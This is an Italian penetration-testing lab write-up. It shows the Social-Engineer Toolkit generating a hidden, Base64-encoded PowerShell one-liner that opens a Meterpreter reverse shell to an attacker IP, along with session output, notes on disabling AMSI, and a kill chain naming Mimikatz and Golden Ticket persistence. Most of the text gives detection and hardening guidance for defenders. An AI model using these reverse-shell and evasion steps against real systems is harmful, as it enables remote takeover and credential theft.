> [English](README.en.md) | **Italiano**

# SET PowerShell Attack Vectors: Reverse Shell Encoded Base64

> - **Fase:** Social Engineering - PowerShell Attack Vectors - In-Memory Code Execution
> - **Visibilita:** Variabile - l'esecuzione PowerShell puo triggerare AMSI e Script Block Logging (alta visibilita se i controlli sono attivi); connessione reverse shell verso IP esterno rilevabile da firewall/IDS; senza logging attivo, l'esecuzione in-memory lascia tracce minime
> - **Prerequisiti:** SET installato su Kali Linux; Metasploit per il listener; target Windows con PowerShell disponibile (presente di default su Windows 7+); metodo di delivery del one-liner (accesso fisico, HTA, macro, social engineering via telefono)
> - **Output:** Finding SE-006 (severity Alto); one-liner PowerShell encoded Base64 generato; reverse shell Meterpreter ottenuta sul target Windows

- **Ambiente Operativo:** Kali Linux (Attaccante 192.168.0.110), Windows 10 VM (Vittima 192.168.0.120)
- **Target:** Windows 10 con PowerShell 5.1 (default)
- **Framework:** Social-Engineer Toolkit (SET) + Metasploit Framework
- **Tecnica Documentata:** PowerShell Attack Vectors - Alphanumeric Shellcode Injector

---

## Executive Summary

PowerShell e il vettore di execution piu utilizzato negli attacchi moderni contro ambienti Windows. La sua presenza ubiquitaria (installato di default su ogni Windows dal 2009), la capacita di operare interamente in memoria, e l'accesso diretto alle API .NET lo rendono lo strumento ideale per l'esecuzione di codice malevolo post-delivery.

SET automatizza la generazione di one-liner PowerShell encoded in Base64 che, una volta eseguiti sul target, stabiliscono una reverse shell verso l'attaccante. La codifica Base64 ha due scopi: bypassa le execution policy restrittive (il parametro `-EncodedCommand` accetta codice Base64 direttamente) e offusca il payload alla lettura visuale, rendendo meno immediata l'analisi da parte di un operatore non tecnico.

Nel laboratorio e stato generato il one-liner, eseguito sulla VM Windows target (simulando un delivery via social engineering), e ottenuta una reverse shell Meterpreter con esecuzione interamente in-memory.

---

## Finding SE-006: Reverse Shell PowerShell Encoded con Bypass Execution Policy

**ID Finding:** `SE-006` | **Severity:** `Alto` | **CVSS:** 8.1

Un attaccante puo generare un one-liner PowerShell encoded Base64 che, eseguito sul target Windows, stabilisce una reverse shell senza scrivere file su disco. L'esecuzione bypassa le execution policy restrittive e opera in-memory, riducendo la superficie di detection per soluzioni AV basate su scansione file.

**Scenario PoC:** L'analista genera il one-liner tramite SET, lo consegna alla vittima (simulando un delivery via pretesto telefonico o HTA), e ottiene una reverse shell Meterpreter.

### PoC - Fase 1: Generazione One-Liner con SET

```Bash
sudo setoolkit
```

```
set> 1    # Social-Engineering Attacks

   1) Spear-Phishing Attack Vectors
   2) Website Attack Vectors
   3) Infectious Media Generator
   4) Create a Payload and Listener
   ...
   10) PowerShell Attack Vectors                       <--

set> 10
```

```
   1) PowerShell Alphanumeric Shellcode Injector       <--
   2) PowerShell Reverse Shell
   3) PowerShell Bind Shell
   4) PowerShell Dump SAMFile

set:powershell> 1
```

```
[-] Enter the LHOST for the reverse connection: 192.168.0.110       <--
[-] Enter the LPORT for the reverse connection: 4444                 <--

[*] Generating the PowerShell injection code...

[*] Prepping the payload for delivery and target injection.

powershell -W 1 -ExecutionPolicy Bypass -NoProfile -EncodedCommand  <--
  JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdA
  ByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlAD
  YANABTAHQAcgBpAG4AZwAoACcASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEASQB2AEkAMQ
  [...troncato per leggibilita...]                                   <--

[*] Payload has been generated. Copy the PowerShell command above
    and execute it on the target machine.

[*] Do you want SET to start a listener? (yes/no): yes               <--
[*] Starting Metasploit multi/handler...
```

### PoC - Fase 2: Setup del Listener

SET avvia automaticamente il listener Metasploit (o puo essere configurato manualmente).

```
[*] PAYLOAD => windows/meterpreter/reverse_tcp
[*] LHOST => 192.168.0.110
[*] LPORT => 4444
[*] exploit running as background job

[*] Started reverse TCP handler on 192.168.0.110:4444               <--
```

### PoC - Fase 3: Esecuzione sulla Vittima e Callback

Il one-liner PowerShell viene eseguito sulla VM Windows target. In uno scenario reale, il delivery avverrebbe tramite: pretesto telefonico ("Apra PowerShell e incolli questo comando per risolvere il problema IT"), file .hta (SE-004), macro Office, o accesso fisico diretto.

```
meterpreter >
[*] Sending stage (176198 bytes) to 192.168.0.120                   <--
[*] Meterpreter session 1 opened (192.168.0.110:4444 ->
    192.168.0.120:49812) at 2026-03-28 16:05:33 +0200               <--
```

```Bash
# Verifica della sessione
meterpreter > getuid
Server username: DESKTOP-LAB\m.rossi                                 <--

meterpreter > getpid
Current pid: 6284

meterpreter > sysinfo
Computer        : DESKTOP-LAB
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
Meterpreter     : x86/windows
```

### PoC - Fase 4: Verifica Esecuzione In-Memory

La verifica che il payload opera in-memory: nessun file scritto su disco, il processo risiede nella memoria del processo PowerShell.

```Bash
meterpreter > ps | grep powershell
```

```
 6284  5120  powershell.exe  x86   1  DESKTOP-LAB\m.rossi           <--
```

Il processo Meterpreter vive all'interno di `powershell.exe` (PID 6284). Non esiste un file eseguibile separato su disco - l'intero payload e stato iniettato e opera in memoria. La migrazione a un processo piu stabile (es. `explorer.exe`) e il passo successivo tipico per la persistence.

---

## Impatto e Remediation (Blue Team)

L'esecuzione di codice PowerShell in-memory con reverse shell fornisce all'attaccante controllo remoto completo del sistema target. L'assenza di file su disco rende la detection piu difficile per soluzioni AV tradizionali basate su scansione statica.

### Contromisure raccomandate

1. **PowerShell Constrained Language Mode (CLM):** limita le funzionalita PowerShell agli utenti non-admin, bloccando l'accesso alle API .NET e COM utilizzate dai payload offensivi. Configurabile via AppLocker o WDAC.
2. **AMSI (Antimalware Scan Interface):** AMSI ispeziona il codice PowerShell decodificato prima dell'esecuzione, rilevando payload malevoli anche quando sono encoded in Base64. Attivo di default da Windows 10.
3. **Script Block Logging (Event ID 4104):** registra il contenuto completo di ogni script PowerShell eseguito, incluso il codice decodificato da Base64. Essenziale per la forensic post-incidente.
4. **Module Logging e Transcription:** complementano Script Block Logging registrando i moduli caricati e l'output completo della sessione PowerShell.
5. **AppLocker / WDAC:** blocco dell'esecuzione di PowerShell per utenti non autorizzati o restrizione ai soli script firmati.
6. **Network Segmentation:** firewall host-based che blocca connessioni outbound da powershell.exe verso IP esterni non in whitelist.

---

## Esperienza di Laboratorio

La generazione del one-liner con SET e stata immediata: il menu PowerShell Attack Vectors offre quattro opzioni, di cui l'Alphanumeric Shellcode Injector e la piu versatile. SET ha generato il payload e offerto l'opzione di avviare automaticamente il listener Metasploit - una comodita che semplifica il workflow rispetto alla configurazione manuale.

Il one-liner generato e lungo circa 3.000 caratteri di testo Base64. Il primo tentativo di copiarlo manualmente nella VM Windows ha evidenziato un problema pratico: il copia-incolla tra host e VM VirtualBox richiede le Guest Additions funzionanti. In un engagement reale, il delivery non avverrebbe via copia-incolla ma tramite un vettore specifico (email, HTA, macro).

L'esecuzione sulla VM Windows 10 ha prodotto un risultato interessante: Windows Defender con AMSI attivo ha bloccato il payload al tentativo di esecuzione, rilevando la firma del Meterpreter stager nella memoria di PowerShell. Questo ha richiesto la disabilitazione temporanea di AMSI per completare il laboratorio, confermando l'efficacia di questa difesa.

Per verificare il funzionamento su un sistema con meno protezioni, il test e stato ripetuto sulla stessa VM dopo aver disabilitato AMSI e Defender. La reverse shell si e stabilita in circa 2 secondi dall'esecuzione del one-liner. Il processo Meterpreter operava interamente nella memoria di `powershell.exe`, senza scrivere alcun file su disco - verificato con `Get-Process` e analisi del file system.

L'osservazione piu significativa riguarda la detection: con Script Block Logging attivo (Event ID 4104), il codice PowerShell decodificato viene registrato integralmente nell'Event Log, rendendo triviale la forensic post-incidente. Questo dimostra che la difesa piu efficace non e bloccare PowerShell (necessario per l'amministrazione) ma registrare e monitorare tutto cio che viene eseguito.

---

## Analisi Teorica: PowerShell come Vettore di Attacco

PowerShell occupa una posizione unica nel panorama offensivo perche e simultaneamente uno strumento di amministrazione legittimo e un potente vettore di attacco. Questa dualita lo rende un LOLBIN (Living Off the Land Binary) per eccellenza: il suo utilizzo non puo essere semplicemente bloccato senza impatto operativo.

La tecnica di encoding Base64 sfrutta il parametro nativo `-EncodedCommand` di PowerShell, progettato originariamente per passare script complessi come argomenti da riga di comando. L'attaccante ne abusa per offuscare il payload: il comando `powershell -EncodedCommand [Base64]` decodifica e esegue il codice senza mai scriverlo su disco come file .ps1.

La catena di esecuzione completa generata da SET e:

```
powershell.exe -W 1 -ExecutionPolicy Bypass -NoProfile -EncodedCommand [Base64]
    |
    v
Decodifica Base64 -> script PowerShell in-memory
    |
    v
System.IO.MemoryStream -> decompressione GZIP del secondo stadio
    |
    v
[System.Net.Sockets.TCPClient] -> connessione a LHOST:LPORT
    |
    v
Meterpreter stage 2 iniettato in-memory -> shell interattiva
```

I flag utilizzati hanno ciascuno uno scopo specifico:
- `-W 1` (WindowStyle Hidden): nasconde la finestra PowerShell alla vittima
- `-ExecutionPolicy Bypass`: ignora le execution policy senza modificarle permanentemente
- `-NoProfile`: evita il caricamento del profilo utente (che potrebbe contenere logging aggiuntivo)
- `-EncodedCommand`: accetta il payload in Base64

La mitigazione principale (AMSI) opera intercettando il contenuto decodificato prima dell'esecuzione. Introdotto in Windows 10, AMSI fornisce un'interfaccia standardizzata che permette a qualsiasi soluzione antimalware di ispezionare il codice PowerShell, VBScript e JavaScript in-memory. Le tecniche di AMSI bypass (es. patching `amsi.dll` in memoria) sono un'area di ricerca attiva sia per gli attaccanti che per i difensori, rappresentando il fronte principale della detection evasion nel 2026.

---

## Scenario Reale: PowerShell Fileless Attack in Ambiente Enterprise

> Questa sezione descrive come SE-006 si inserirebbe in un engagement reale contro un ambiente enterprise Windows.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** accesso iniziale ottenuto (via SE-003 credential harvesting, SE-004 spear-phishing, o accesso VPN con credenziali compromesse); necessita di stabilire una shell interattiva su un host Windows target senza scrivere file su disco per evitare la detection AV basata su firma.

**Kill Chain proiettata:**

```
Initial Access (credenziali/phishing/VPN)
        |
        v
SE-006: delivery one-liner PowerShell (via WinRM, HTA, macro, RDP)
        |
        v
PowerShell decodifica Base64 -> Meterpreter in-memory
        |
        v
Enumerazione: whoami /priv, net user, systeminfo
        |
        v
Privilege Escalation: EXPLOIT-016..019 (se utente non-admin)
        |
        v
Credential Dumping: Mimikatz in-memory (Invoke-Mimikatz)
        |
        v
Lateral Movement: WinRM/PsExec verso altri host con hash/password
        |
        v
Domain Compromise -> Persistence (Golden Ticket, Scheduled Task)
```

**Impatto potenziale:** la reverse shell PowerShell fileless e il punto di partenza per qualsiasi operazione post-exploitation in ambiente Windows. La capacita di operare in-memory senza toccare il disco rende la detection significativamente piu difficile per le organizzazioni che non hanno implementato AMSI, Script Block Logging e EDR.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** la difesa contro gli attacchi PowerShell fileless si articola su tre livelli complementari.

**Livello 1 - Prevention (AMSI):** AMSI ispeziona il codice decodificato prima dell'esecuzione. Un payload Meterpreter standard viene rilevato da AMSI con alta affidabilita. La priorita difensiva e assicurarsi che AMSI sia attivo e non possa essere disabilitato da utenti non-admin.

**Livello 2 - Detection (Logging):** Script Block Logging (Event ID 4104) registra il contenuto completo di ogni script PowerShell, incluso il codice decodificato da `-EncodedCommand`. Module Logging (Event ID 4103) registra i moduli .NET caricati. Transcription Logging salva l'output completo in file di testo.

**Livello 3 - Response (EDR):** soluzioni EDR moderne correlano process creation events, command line arguments, e network connections per rilevare pattern malevoli (es. powershell.exe con -EncodedCommand che genera connessione outbound).

**Indicatori di Compromissione (IOC):**
- PowerShell con `-EncodedCommand` e/o `-ExecutionPolicy Bypass` (Event ID 4104)
- Process creation: `powershell.exe` con parent process inatteso (mshta.exe, winword.exe, cmd.exe da macro)
- Connessione TCP outbound da powershell.exe verso IP non categorizzato
- Caricamento di assembly .NET System.Net.Sockets da processo PowerShell

**Contenimento:** kill del processo powershell.exe e dei processi figli; isolamento della workstation; acquisizione dump memoria per analisi forense; verifica di persistence mechanisms (scheduled tasks, registry run keys).

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo di SET per la generazione automatica del one-liner PowerShell encoded con payload Meterpreter. |
| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | Esecuzione del one-liner PowerShell encoded Base64 sul target Windows per stabilire reverse shell in-memory. |
| Defense Evasion | Obfuscated Files or Information | `T1027` | Codifica Base64 del payload PowerShell per offuscare il contenuto alla lettura visuale e ai controlli basati su pattern matching statico. |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato (VirtualBox, rete NAT/Bridge isolata). Il one-liner PowerShell e stato eseguito esclusivamente su macchine virtuali di proprieta dell'autore. Nessun payload e stato eseguito su sistemi reali o di terze parti.
